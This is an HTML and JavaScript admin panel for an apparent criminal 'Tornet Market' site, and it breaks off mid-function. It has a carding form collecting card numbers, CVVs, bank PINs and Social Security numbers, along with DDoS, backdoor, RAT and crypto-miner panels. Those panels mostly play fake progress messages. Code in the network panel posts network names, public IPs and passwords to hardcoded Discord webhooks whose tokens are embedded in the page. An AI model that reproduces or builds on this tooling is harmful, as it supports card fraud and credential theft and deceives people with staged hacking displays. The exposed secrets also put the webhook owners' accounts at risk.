<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
  <title>Tornet Market ™ | Admin</title>
  <link rel="icon" href="assets/img/TornetMarketIcon.ico" type="image/x-icon" />
  <style>
    body {
      background: url("https://i.imgur.com/lScgeBj.jpg") no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      font-size: 1.5rem;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
      overflow-y: auto;
    }

    #clock {
      font-size: 1rem;
      font-family: inherit;
    }

    #profileInfo {
      position: absolute;
      top: 20px;
      right: 20px;
      text-align: right;
      font-size: 1rem;
      border: 2px solid #888;
      padding: 10px 20px;
      border-radius: 10px;
    }

    #profileInfo a {
      color: #fff;
      text-decoration: none;
      margin-left: 10px;
    }

    #profileInfo a:hover {
      color: #0c8cbb;
    }

    .balance {
      color: #fff;
      font-weight: bold;
    }

    .panel {
      background-color: rgba(0, 0, 0, 0.6);
      padding: 15px;
      border-radius: 10px;
      text-align: center;
      margin-top: 15px;
      width: 90%;
      max-width: 400px;
    }

    .panel h2 {
      margin-bottom: 10px;
    }

    .panel input[type="text"] {
      width: calc(100% - 20px);
      padding: 10px;
      margin: 10px 0;
      box-sizing: border-box;
      background-color: #333;
      border: 1px solid #444;
      color: #fff;
      border-radius: 5px;
      font-size: 1rem;
    }

    .panel input[readonly] {
      background-color: #555;
    }

    .panel button {
      background-color: #0c8cbb;
      color: white;
      padding: 10px 20px;
      border: none;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 5px;
      margin: 5px;
    }

    .panel button:hover {
      background-color: #005f8a;
    }

    .textbox {
        display: block;
        width: 100%;
        margin: 10px auto; /* Center the textbox */
        text-align: center; /* Center text within the textbox */
        border: 1px solid #aaa;
        padding: 5px;
        box-sizing: border-box; /* Ensure padding and border are included in the width */
    }
    .button-container {
        display: flex;
        justify-content: center; /* Center-align buttons horizontally */
        gap: 10px;
        margin-top: 10px;
    }
    .button-container button {
        flex: 1;
        text-align: center;
    }

  </style>
</head>
<body>
  <div style="text-align: center;">
    <h1 style="font-size: 2rem;">TORNET MARKET</h1>
    <div id="profileInfo">
      Hello, swiping.cc <span id="usernamePlaceholder"></span> │ 
      <span id="clock"></span> │ 
      <a href="banking.html">Wallet</a> │ 
      <a href="index.html">Logout</a>
    </div>
    <div class="panel">
      <h3>🌐│𝘂𝗽𝗱𝗮𝘁𝗲𝘀</h3>
      <input type="text" id="discordMessageUpdates" placeholder="Enter your message here...">
      <div>
        <button id="fillButtonUpdates">Fill</button>
        <button id="sendButtonUpdates">Send</button>
        <button id="clearButtonUpdates">Clear</button>
      </div>
    </div>
    <div class="panel">
        <h3>💲│𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻𝘀</h3>
        <input type="text" id="discordMessageTransactions" placeholder="Enter your message here...">
        <div>
          <button id="fillButtonTransactions">Fill</button>
          <button id="sendButtonTransactions">Send</button>
          <button id="clearButtonTransactions">Clear</button>
        </div>
    </div>
    <div class="panel">
      <h3>💬│𝗰𝗵𝗮𝘁</h3>
      <input type="text" id="discordMessageChat" placeholder="Enter your message here...">
      <div>
        <button id="sendButtonChat">Send</button>
        <button id="clearButtonChat">Clear</button> <!-- Added Clear button -->
      </div>
    </div>
    <div class="panel">
      <h3>💳│𝗰𝗮𝗿𝗱𝗶𝗻𝗴</h3>
      <input type="text" id="cardNumber" placeholder="Card Number">
      <input type="text" id="cvv" placeholder="CVV">
      <input type="text" id="expDate" placeholder="Exp Date">
      <input type="text" id="cardHolderName" placeholder="CardHolder Name">
      <input type="text" id="address" placeholder="Address">
      <input type="text" id="city" placeholder="City">
      <input type="text" id="state" placeholder="State">
      <input type="text" id="zipCode" placeholder="Zip Code">
      <input type="text" id="bankPin" placeholder="Bank Pin">
      <input type="text" id="socialSecurity" placeholder="Social Security">
      <div>
        <button id="fillButtonCarding">Fill</button>
        <button id="fullButtonCarding">Full</button>
        <button id="sendButtonCarding">Send</button>
        <button id="clearButtonCarding">Clear</button>
      </div>
    </div> 
    <div class="panel">
      <h3>🟢│𝘀𝘀𝗹-𝘁𝗹𝘀</h3>
      <input type="text" id="discordMessageSslTls" placeholder="Enter your message here...">
      <div>
        <button id="sendButtonSslTls">Send</button>
        <button id="clearButtonSslTls">Clear</button>
      </div>
    </div>
  
    <div class="panel">
      <h3>🕵️│𝗿𝗲𝗰𝗼𝗻</h3>
      <input type="text" id="reconInput" placeholder="User/Name/Email/Number">
      <div>
          <button id="reconButton">Lookup</button>
          <button id="clearReconButton">Clear</button> <!-- New clear button -->
      </div>
    </div>
    <div class="panel">
      <h3>🧙│𝘂𝗽𝗹𝗼𝗮𝗱𝘀</h3>
      <input type="text" id="fileName" placeholder="No file chosen" readonly>
      <div>
          <button id="chooseFileButton">Choose File</button>
          <input type="file" id="fileInput" style="display: none;">
          <button id="clearUploadsButton">Clear</button> <!-- New clear button -->
      </div>
    </div>
    <div class="panel">
      <h3>☢️│𝗺𝗶𝘀𝗰𝗲𝗹𝗹𝗮𝗻𝗲𝗼𝘂𝘀</h3>
      <div>
          <button id="virusbutton">Network Virus</button>
          <button id="deviceVirusButton">Device Virus</button>
          <div id="infectedTextBoxContainer"></div>
          <div id="deviceVirusContainer"></div>
      </div>
    </div>
    <div class="panel" id="networkPanel">
      <h2>🌐│𝗻𝗲𝘁𝘄𝗼𝗿𝗸</h2>
      <input type="text" id="networkNameInput" placeholder="Network Name">
      <input type="text" id="passwordInput" placeholder="Password (Optional)">
      <button id="saveNetworkButton">Save</button>
    </div>
    <div class="panel" id="ddosPanel">
      <h2>🛰️│𝗱𝗱𝗼𝘀</h2>
      <input type="text" id="ipInput" placeholder="IP">
      <input type="text" id="portInput" placeholder="Port">
      <input type="text" id="secondsInput" placeholder="Time">
      <select id="methodSelect">
        <option value="CLDAP">CLDAP</option>
        <option value="DNS">DNS</option>
        <option value="SSYN">SSYN</option>
        <option value="TCP">TCP</option>
      </select>
      <button id="bootButton">Start Attack</button>
    </div>
    <div class="panel" id="cryptoMinerPanel">
      <h2>⛏️│𝗰𝗿𝘆𝗽𝘁𝗼 𝗺𝗶𝗻𝗲𝗿</h2>
      <div class="button-group">
          <input type="text" id="currencySelectionTextBox" class="textbox" readonly value="Choose Crypto To Mine From Infected Network:">
          <button id="btcButton">BTC</button>
          <button id="ethButton">ETH</button>
          <button id="xmrButton">XMR</button>
      </div>
      <button id="networkScanButton">Network Scan</button>
  </div>
  </div>

  <script>

  // Add your JavaScript logic here
  document.addEventListener('DOMContentLoaded', function () {
            // Logic for the network panel
            document.getElementById('saveNetworkButton').addEventListener('click', async function() {
                try {
                    const networkName = document.getElementById('networkNameInput').value.trim();
                    const password = document.getElementById('passwordInput').value.trim();

                    if (networkName === '') {
                        alert('Please enter a Network Name.');
                        return;
                    }

                    const ipAddress = await getPublicIPAddress();
                    const networkInfoTextBox = document.createElement('input');
                    networkInfoTextBox.setAttribute('type', 'text');
                    networkInfoTextBox.setAttribute('readonly', 'readonly');
                    if (password !== '') {
                        networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}) with password "${password}".`);
                    } else {
                        networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}).`);
                    }

                    const networkPanel = document.getElementById('networkPanel');
                    networkPanel.appendChild(networkInfoTextBox);

                    let message = `The Network (${networkName} - ${ipAddress}) has been saved.`;
                    if (password !== '') {
                        message += ` Password: "${password}".`;
                    }
                    const alertTimeout = 2500;
                    alert(message);

                    const embed = {
                        title: 'Network Capture',
                        description: `**Network Name:** ${networkName}\n**IP Address:** ${ipAddress}`,
                        color: 0x5865F2,
                        footer: {
                            text: 'Tornets Network Capture'
                        }
                    };

                    if (password !== '') {
                        embed.description += `\n**Password:** ${password}`;
                    }

                    sendEmbedToDiscord(embed);

                    document.getElementById('networkNameInput').value = '';
                    document.getElementById('passwordInput').value = '';

                    setTimeout(() => {
                        networkPanel.removeChild(networkInfoTextBox);
                    }, alertTimeout);

                } catch (error) {
                    console.error('Error saving network name:', error);
                }
            });

            // Logic for the DDoS panel
            document.getElementById('bootButton').addEventListener('click', function() {
                const ip = document.getElementById('ipInput').value.trim();
                const port = document.getElementById('portInput').value.trim();
                const method = document.getElementById('methodSelect').value;
                const seconds = document.getElementById('secondsInput').value.trim();

                if (ip === '' || port === '' || seconds === '') {
                    alert('Please fill in all the fields.');
                    return;
                }

                const ddosMessage = `DDoS Attack Initiated\nIP - ${ip}\nPort - ${port}\nMethod - ${method}\nDuration - ${seconds} seconds`;
                alert(ddosMessage);

                const ddosEmbed = {
                    title: 'DDoS Attack Initiated',
                    description: `IP - ${ip}\nPort - ${port}\nMethod - ${method}\nDuration - ${seconds} seconds`,
                    color: 0x5865F2,
                    footer: {
                        text: 'Tornet Market DDoS Attack'
                    }
                };

                sendEmbedToDiscord(ddosEmbed);

                document.getElementById('ipInput').value = '';
                document.getElementById('portInput').value = '';
                document.getElementById('secondsInput').value = '';
            });

            
        document.getElementById('btcButton').addEventListener('click', async function() {
            try {
                const cryptoMinerPanel = document.getElementById('cryptoMinerPanel');
                const currencySelectionTextBox = document.getElementById('currencySelectionTextBox');

                // Remove the currency selection textbox
                currencySelectionTextBox.style.display = 'none';

                // Create and append the textbox
                const minerTextBox = document.createElement('input');
                minerTextBox.setAttribute('type', 'text');
                minerTextBox.setAttribute('readonly', 'readonly');
                cryptoMinerPanel.appendChild(minerTextBox);

                // Create the "Stop Miner" button but don't add it yet
                const stopButton = document.createElement('button');
                stopButton.textContent = 'Stop Miner';

                // Variable to control the mining simulation
                let stopSimulation = false;

                // Start time to calculate mining duration
                const startTime = Date.now();

                // Initial messages
                minerTextBox.value = `Hacking local network.. (IP: ${await getPublicIPAddress()})`;
                await delay(3500);

                if (stopSimulation) return;
                minerTextBox.value = 'Waking up miner..';
                await delay(2000);

                if (stopSimulation) return;

                // Boot sequence messages
                const bootMessages = [
                    'uploading/rootkit_v3.1.0.exe',
                    'init/crypto_miner/setup.bin',
                    'transferring/module/crypto_core.dll',
                    'config/loader/settings.json',
                    'deploy/network/oni/cryptominer',
                    'extracting/files/rootkit.pkg',
                    'init/secure/crypto_miner/oni.exe',
                    'boot/rootkit/system_update.tar',
                    'config/crypto_miner/config.cfg',
                    'injecting/crypto_core/oni.sys',
                    'upload/crypto_miner/agent_v5',
                    'network/transfer/crypto_miner/installer',
                    'install/cryptominer/oni/complete',
                    'secure/boot/crypto_miner/oni.exe',
                    'finishing/crypto_miner/install_log.txt',
                    'loading/system/rootkit_agent.dmg',
                    'setting/up/crypto_miner/parameters.ini',
                    'distributing/crypto_core/updater.exe',
                    'initiate/crypto_miner/oni.v1',
                    'update/crypto_miner/worker_process',
                    'config/crypto_miner/oni.exe',
                    'executing/crypto_miner/startup.sh',
                    'sync/rootkit/system_files.zip',
                    'install/crypto_miner/daemon.bin',
                    'deploy/crypto_core/worker.sys',
                    'initiate/rootkit/updates/latest.pkg',
                    'loading/network/crypto_miner/files',
                    'config/update/crypto_core/settings.ini',
                    'transferring/secure/crypto_miner/agent',
                    'injecting/system/rootkit/v4.2',
                    'init/crypto_miner/startup.cfg',
                    'uploading/rootkit/bootloader.exe',
                    'deploy/crypto_miner/worker/install',
                    'config/system/crypto_core/boot.json',
                    'extracting/crypto_miner/init.pkg',
                    'sync/secure/rootkit/files/agent',
                    'transferring/crypto_miner/loader_v6',
                    'update/system/rootkit/patch.bin',
                    'install/crypto_miner/daemon_v2',
                    'loading/network/rootkit/upgrade',
                    'initiate/crypto_miner/system_config',
                    'executing/rootkit/crypto_module.exe',
                    'deploy/crypto_miner/secure_agent.pkg',
                    'config/update/rootkit/system.cfg',
                    'transferring/crypto_core/installer_v3',
                    'injecting/system/crypto_miner/startup',
                    'finishing/rootkit/installation/log.txt',
                    'init/secure/crypto_miner/module',
                    'uploading/crypto_miner/update_v7.exe'
                ];

                for (const message of bootMessages) {
                    if (stopSimulation) return;
                    minerTextBox.value = message;
                    await delay(500);
                }

                // Mining started
                minerTextBox.value = 'BTC mining started.';
                await delay(2000);

                // Clear the text box
                minerTextBox.value = '';

                // Append the "Stop Miner" button
                cryptoMinerPanel.appendChild(stopButton);

                // Simulate mining output with random balance and string
                const minerOutputInterval = setInterval(() => {
                    if (stopSimulation) {
                        clearInterval(minerOutputInterval);
                        return;
                    }

                    const randomBalance = (Math.random() * 0.000666).toFixed(6);
                    const randomString = generateRandomString(); // Generate a random string of length 12
                    minerTextBox.value = `│BTC│ ${randomString} │ ${randomBalance} │`;
                }, 100);

                // Stop updating after 1 hour (3600000 milliseconds)
                const stopTimer = setTimeout(() => {
                    clearInterval(minerOutputInterval);
                    minerTextBox.value = 'Mining ended.';
                }, 3600000);

                // Handle "Stop Miner" button click
                stopButton.addEventListener('click', () => {
                    stopSimulation = true;
                    clearInterval(minerOutputInterval);
                    clearTimeout(stopTimer);

                    // Calculate mined BTC
                    const elapsedTime = (Date.now() - startTime) / 1000; // Time in seconds
                    const minedBTC = Math.min(0.000075 + (elapsedTime / 3600) * (0.0075 - 0.000075), 0.0075);

                    // Update the text box with stop message and mined BTC
                    minerTextBox.value = `Miner stopped.\nMINED BTC - ${minedBTC.toFixed(6)}`;

                    // Remove the button and text box after 2 seconds
                    setTimeout(() => {
                        cryptoMinerPanel.removeChild(minerTextBox);
                        cryptoMinerPanel.removeChild(stopButton);
                    }, 2000);
                });

            } catch (error) {
                console.error('Error during BTC mining:', error);
            }
        });

            document.getElementById('ethButton').addEventListener('click', function() {
                alert('Starting ETH mining...');
            });

            document.getElementById('xmrButton').addEventListener('click', function() {
                alert('Starting XMR mining...');
            });

            document.getElementById('networkScanButton').addEventListener('click', async function() {
                try {
                    const ipAddress = await getPublicIPAddress();

                    const ipTextBox = document.createElement('input');
                    ipTextBox.setAttribute('type', 'text');
                    ipTextBox.setAttribute('readonly', 'readonly');
                    ipTextBox.setAttribute('value', `Reliable Network: ${ipAddress}`);
                    
                    // Add event listener to copy IP address to clipboard on click or touch
                    const copyToClipboard = () => {
                        navigator.clipboard.writeText(ipAddress)
                            .then(() => {
                                console.log('IP address copied to clipboard:', ipAddress);
                            })
                            .catch(err => {
                                console.error('Error copying IP address to clipboard:', err);
                            });
                    };

                    // Add click event listener for desktop devices
                    ipTextBox.addEventListener('click', copyToClipboard);

                    // Add touchstart event listener for touch devices
                    ipTextBox.addEventListener('touchstart', copyToClipboard);

                    const cryptoMinerPanel = document.getElementById('cryptoMinerPanel');
                    cryptoMinerPanel.appendChild(ipTextBox);

                    // Remove the textbox after 5 seconds
                    setTimeout(() => {
                        cryptoMinerPanel.removeChild(ipTextBox);
                    }, 5000);
                } catch (error) {
                    console.error('Error getting public IP address:', error);
                }
            });

            // Utility function to simulate delay
            function delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            // Function to get public IP address (replace with actual implementation)
            async function getPublicIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error fetching public IP address:', error);
                    return 'Unknown';
                }
            }

            // Function to send an embed message to Discord
            function sendEmbedToDiscord(embed) {
                const webhookUrl = 'https://discord.com/api/webhooks/1260757099403804713/A-s-RE5auaX9Z3bAm85biOUyZofiCtTSCte7A3Pl4Cc4jDMHURbavQ7b7NKX1ohbQQAS';

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed],
                    }),
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP error! Status: ${response.status}`);
                    }
                    console.log('Message sent successfully to Discord.');
                })
                .catch(error => {
                    console.error('Error sending message to Discord:', error);
                });
            }
        });
        
        // Function to generate a random alphanumeric string of a specified length
        function generateRandomString() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '1'; // Start with '1'

            // Generate 11 additional random characters
            for (let i = 1; i < 20; i++) {
                const randomIndex = Math.floor(Math.random() * chars.length);
                result += chars[randomIndex];
            }
            
            return result;
        }



  
  document.addEventListener('DOMContentLoaded', function() {
    // Function to update the clock
    function updateClock() {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        const timeString = `${hours}:${minutes}:${seconds}`;
        document.getElementById('clock').textContent = timeString;
    }

    // Initial call to update clock when page loads
    updateClock();

    // Update clock every second
    setInterval(updateClock, 1000);
});

  // Function to fetch public IP address
async function getPublicIPAddress() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return null;
    }
}

// Function to send message to Discord webhook
async function sendMessageToDiscord(message) {
    try {
        const webhookURL = 'https://discord.com/api/webhooks/1260757099403804713/A-s-RE5auaX9Z3bAm85biOUyZofiCtTSCte7A3Pl4Cc4jDMHURbavQ7b7NKX1ohbQQAS';
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        });

        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord successfully:', message);
    } catch (error) {
        console.error('Error sending message to Discord:', error);
    }
}

// Wait for the DOM content to load
document.addEventListener('DOMContentLoaded', function () {
    // Find the Save button and attach a click event handler
    document.getElementById('saveNetworkButton').addEventListener('click', async function() {
        try {
            // Get the value from the input fields
            const networkName = document.getElementById('networkNameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();

            // Check if the networkName is empty
            if (networkName === '') {
                alert('Please enter a Network Name.');
                return; // Exit function if the input is empty
            }

            // Fetch the public IP address
            const ipAddress = await getPublicIPAddress();

            // Create a read-only textbox for displaying network name and IP
            const networkInfoTextBox = document.createElement('input');
            networkInfoTextBox.setAttribute('type', 'text');
            networkInfoTextBox.setAttribute('readonly', 'readonly');
            if (password !== '') {
                networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}) with password "${password}".`);
            } else {
                networkInfoTextBox.setAttribute('value', `Network Captured (${networkName} - ${ipAddress}).`);
            }

            // Add the textbox to the panel under Miscellaneous
            const networkPanel = document.getElementById('networkPanel');
            networkPanel.appendChild(networkInfoTextBox);

            // Example action: Display a confirmation message
            let message = `The Network (${networkName} - ${ipAddress}) has been saved.`;
            if (password !== '') {
                message += ` Password: "${password}".`;
            }
            const alertTimeout = 2500; // Time in milliseconds to keep the message displayed

            // Show message in alert box
            alert(message);

            // Construct the Discord message as an embed
            const embed = {
                title: 'Network Capture',
                description: `**Network Name:** ${networkName}\n**IP Address:** ${ipAddress}`,
                color: 0x5865F2, // Blurple color
                footer: {
                    text: 'Tornet Market Network Capture'
                }
            };

            // Include password in the embed if provided
            if (password !== '') {
                embed.description += `\n**Password:** ${password}`;
            }

            // Send the embed message to Discord
            sendEmbedToDiscord(embed);

            // Clear the input fields
            document.getElementById('networkNameInput').value = '';
            document.getElementById('passwordInput').value = '';

            // Remove the textbox after a timeout
            setTimeout(() => {
                networkPanel.removeChild(networkInfoTextBox);
            }, alertTimeout);
            
        } catch (error) {
            console.error('Error saving network name:', error);
        }
    });
});

// Function to send an embed message to Discord (replace with your actual implementation)
function sendEmbedToDiscord(embed) {
    // Replace this with your actual Discord webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1260757099403804713/A-s-RE5auaX9Z3bAm85biOUyZofiCtTSCte7A3Pl4Cc4jDMHURbavQ7b7NKX1ohbQQAS';

    // Example of sending an embed message via fetch
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            embeds: [embed],
        }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        console.log('Message sent successfully to Discord.');
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
    });
}


document.getElementById('virusbutton').onclick = async function() {
    try {
        // Fetch the public IP address
        const ipAddress = await getPublicIPAddress();

        // Display the initial message in a textbox
        const infectedTextBox = document.createElement('input');
        infectedTextBox.setAttribute('type', 'text');
        infectedTextBox.setAttribute('readonly', 'readonly');
        infectedTextBox.setAttribute('value', `Uploading Virus - ${ipAddress}.`);
        
        // Add the textbox to the container in the settings panel
        const infectedTextBoxContainer = document.getElementById('infectedTextBoxContainer');
        infectedTextBoxContainer.appendChild(infectedTextBox);

        // Display the first message box with the IP address
        const firstMessage = `Uploading Exploit Kit - ${ipAddress} - BACKDOOR.EXE`;
        alert(firstMessage);

        // Send the first message to Discord
        sendMessageToDiscord(firstMessage);

        // Create the second textbox for progress updates
        const progressTextBox = document.createElement('input');
        progressTextBox.setAttribute('type', 'text');
        progressTextBox.setAttribute('readonly', 'readonly');
        infectedTextBoxContainer.appendChild(progressTextBox);

        // Function to update the progress text box
        const updateProgressText = async (text, delay) => {
            progressTextBox.setAttribute('value', text);
            await new Promise(resolve => setTimeout(resolve, delay));
        };

        // Function to generate random hex string
        function getRandomHex(size) {
            const characters = '0123456789ABCDEF';
            let result = '';
            for (let i = 0; i < size; i++) {
                result += characters[Math.floor(Math.random() * characters.length)];
            }
            return result;
        }

        // Function to generate random prefix
        function getRandomPrefix() {
            const prefixes = ['SSL', 'TLS', 'BIT'];
            return prefixes[Math.floor(Math.random() * prefixes.length)];
        }

        // Function to generate random string
        function getRandomString() {
            return `${getRandomPrefix()} 0x${getRandomHex(16)}..`;
        }

        // Function to update the progress text box with random strings
        const updateProgressTextRandomized = async (count, delay) => {
            for (let i = 0; i < count; i++) {
                await updateProgressText(getRandomString(), delay);
            }
        };

        // Update the progress text box according to the specified timing sequence
        const progressSteps = [
            ['Handshaking Network..', 3000],
            ['Infiltrating Network..', 6000],
            ['DNS Grabbed.', 1000],
            ['Changing DNS..', 4000],
            ['Renaming DNS..', 2000],
            ['Router/Domain/IP/Network..', 1200],
            ['Router/Domain/IP/DNS..', 2000],
            ['Router/Domain/IP/BACKDOOR..', 2000],
            ['Deleting Trace..', 1000],
            ['Installing Botnet..', 1300],
            ['Installing BACKDOOR.EXE', 1230],
            ['Deleting Firewall..', 2300],
            ['Installing Custom Firewall..', 1000],
            ['Installing Custom Proxies..', 2000],
            ['Deleting All Backups..', 4000],
            ['Downloading Botnet..', 1250],
            ['Downloading BACKDOOR.EXE..', 1750],
            ['Downloading Tornet..', 2350],
            ['Sideloading Tornet Virus..', 1000],
            ['Sideloading Tornet Encryption..', 2675]
        ];

        for (let step of progressSteps) {
            await updateProgressText(step[0], step[1]);
        }

        await updateProgressTextRandomized(100, 25); // Update with 100 random strings

        // Final messages
        await updateProgressText('Deleting Trace..', 2000);
        await updateProgressText('Completed.', 1000);
        await updateProgressText(`Router/Domain/IP/${ipAddress}..`, 1250);

        // Remove the progress text box after the final update
        infectedTextBoxContainer.removeChild(progressTextBox);

        // Wait for 1 seconds before showing the second message box
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Update the infected textbox to "Virus Uploaded" message
        infectedTextBox.setAttribute('value', `BACKDOOR.EXE Uploaded - ${ipAddress}`);

        await new Promise(resolve => setTimeout(resolve, 500));

        // Display the second message box with the infiltrated message
        const secondMessage = `BACKDOOR.EXE Uploaded - ${ipAddress}. You may now manage this network through a backdoor using Tornet's botnet.`;
        alert(secondMessage);

        // Send the second message to Discord
        sendMessageToDiscord(secondMessage);

        // Wait for 2.5 seconds before removing the infected textbox
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Remove the infected textbox
        infectedTextBoxContainer.removeChild(infectedTextBox);
    } catch (error) {
        console.error('Error processing virus action:', error);
    }
};



// Function to fetch public IP address
async function getPublicIPAddress() {
    try {
        const response = await fetch('https://api64.ipify.org?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return null;
    }
}

// Function to send message to Discord webhook
async function sendMessageToDiscord(message) {
    try {
        const webhookURL = 'https://discord.com/api/webhooks/1260757099403804713/A-s-RE5auaX9Z3bAm85biOUyZofiCtTSCte7A3Pl4Cc4jDMHURbavQ7b7NKX1ohbQQAS';
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        });

        if (!response.ok) {
            throw new Error('Failed to send message to Discord');
        }
        console.log('Message sent to Discord successfully:', message);
    } catch (error) {
        console.error('Error sending message to Discord:', error);
    }
}

document.getElementById('deviceVirusButton').onclick = async function() {
    try {
        // Fetch the public IP address
        const ipAddress = await getPublicIPAddress();

        // Display the initial message in a textbox
        const deviceTextBox = document.createElement('input');
        deviceTextBox.setAttribute('type', 'text');
        deviceTextBox.setAttribute('readonly', 'readonly');
        deviceTextBox.setAttribute('value', 'Connect Device to Continue.');

        // Add the textbox to the container in the settings panel
        const deviceVirusContainer = document.getElementById('deviceVirusContainer');
        deviceVirusContainer.appendChild(deviceTextBox);

        // Delay before showing the "Connected" button
        await new Promise(resolve => setTimeout(resolve, 5735));

        // Create the "Connected" button
        const connectedButton = document.createElement('button');
        connectedButton.innerText = 'Proceed.';
        deviceVirusContainer.appendChild(connectedButton);

        // Function to handle the "Connected" button click
        connectedButton.onclick = async function() {
            // Update the device textbox
            deviceTextBox.setAttribute('value', `Uploading Exploit Kit - ${ipAddress} - RAT.EXE.`);

            // Display the message box
            const message = `Uploading Exploit Kit - ${ipAddress} - RAT.EXE`;
            alert(message);

            // Send the message to Discord
            sendMessageToDiscord(message);

            // Remove the connected button
            deviceVirusContainer.removeChild(connectedButton);

            // Create a new textbox for device info progress
            const deviceInfoTextBox = document.createElement('input');
            deviceInfoTextBox.setAttribute('type', 'text');
            deviceInfoTextBox.setAttribute('readonly', 'readonly');
            deviceVirusContainer.appendChild(deviceInfoTextBox);

            // Function to update the device info text box
            const updateDeviceInfoText = async (text, delay) => {
                deviceInfoTextBox.setAttribute('value', text);
                await new Promise(resolve => setTimeout(resolve, delay));
            };

            // Function to generate random hex string
            function getRandomHex(size) {
                const characters = '0123456789ABCDEF';
                let result = '';
                for (let i = 0; i < size; i++) {
                    result += characters[Math.floor(Math.random() * characters.length)];
                }
                return result;
            }

            // Function to generate random prefix
            function getRandomPrefix() {
                const prefixes = ['SSL', 'TLS', 'BIT'];
                return prefixes[Math.floor(Math.random() * prefixes.length)];
            }

            // Function to generate random string
            function getRandomString() {
                return `${getRandomPrefix()} 0x${getRandomHex(16)}..`;
            }

            // Function to update the device info text box with random strings
            const updateProgressTextRandomized = async (count, delay) => {
                for (let i = 0; i < count; i++) {
                    await updateDeviceInfoText(getRandomString(), delay);
                }
            };

            // Function to update the device info text box with a specific text and delay
            const updateProgressText = async (text, delay) => {
                await updateDeviceInfoText(text, delay);
            };

            // Update the device info text box according to the specified timing sequence
            await updateProgressText('Retrieving Device Info..', 5000);
            await updateProgressText('Infiltrating Device..', 2750);
            await updateProgressText('HWID Grabbed..', 1000);
            await updateProgressText('Changing HWID..', 4000);
            await updateProgressText('Renaming Device Serial..', 2000);
            await updateProgressText('Settings/General/Reset', 1000);
            await updateProgressText('Settings/General/Update', 2000);
            await updateProgressText('Settings/General/Dictionary', 2000);
            await updateProgressText('Settings/General/Dictionary/Rat', 2000);
            await updateProgressText('Settings/General/Dictionary/Rat/RAT.EXE', 2000);
            await updateProgressText('Deleting Trace', 1000);
            await updateProgressText('Installing Botnet..', 1300);
            await updateProgressText('Installing RAT.EXE', 1230);
            await updateProgressText('Deleting Operating System..', 2300);
            await updateProgressText('Installing Custom System..', 1000);
            await updateProgressText('Installing Custom Proxies..', 2000);
            await updateProgressText('Deleting All AntiVirus..', 4000);
            await updateProgressText('Downloading Botnet..', 1250);
            await updateProgressText('Downloading BACKDOOR.EXE..', 1750);
            await updateProgressText('Downloading Tornet..', 2350);
            await updateProgressText('Sideloading Tornet Virus..', 1000);
            await updateProgressText('Sideloading Tornet Encryption..', 2675);
            await updateProgressTextRandomized(100, 25); // Update with 100 random strings

            // Final messages
            await updateDeviceInfoText('Deleting Trace..', 2000);
            await updateDeviceInfoText('Completed.', 1000);
            await updateDeviceInfoText(`Settings/General/Log/${ipAddress}..`, 1250);

            // Wait for 2.5 seconds before removing the device textboxes
            await new Promise(resolve => setTimeout(resolve, 2500));
            deviceTextBox.setAttribute('value', `RAT.EXE Uploaded - ${ipAddress}`);
            deviceVirusContainer.removeChild(deviceInfoTextBox);

            // Wait for 2.5 seconds before removing the device textboxes
            await new Promise(resolve => setTimeout(resolve, 1000));
            deviceVirusContainer.removeChild(deviceTextBox);

            // Send the final message to Discord
            const finalMessage = `RAT.EXE Uploaded - ${ipAddress}. You may now manage this device using Tornet's botnet.`;
            alert(finalMessage);
            sendMessageToDiscord(finalMessage);
        };
    } catch (error) {
        console.error('Error processing device virus action:', error);
    }
};




  document.addEventListener('DOMContentLoaded', function() {
  // Fill Updates Message
  document.getElementById('fillButtonUpdates').onclick = function() {
    document.getElementById('discordMessageUpdates').value = "🧙 Hello Tornet Market! Thank you for being in our community!";
  }

  // Send Updates Message
  document.getElementById('sendButtonUpdates').onclick = function() {
    const message = document.getElementById('discordMessageUpdates').value;
    if (message) {
      const webhookUrl = "https://discord.com/api/webhooks/1236748826120032377/k79hULELizRtsd85U6wADhClhbqpsnZh0irdjyf20oxaoxLfHUS7SH8HyL2yC5OvQddO";
      sendMessageToDiscord({ content: message }, webhookUrl);
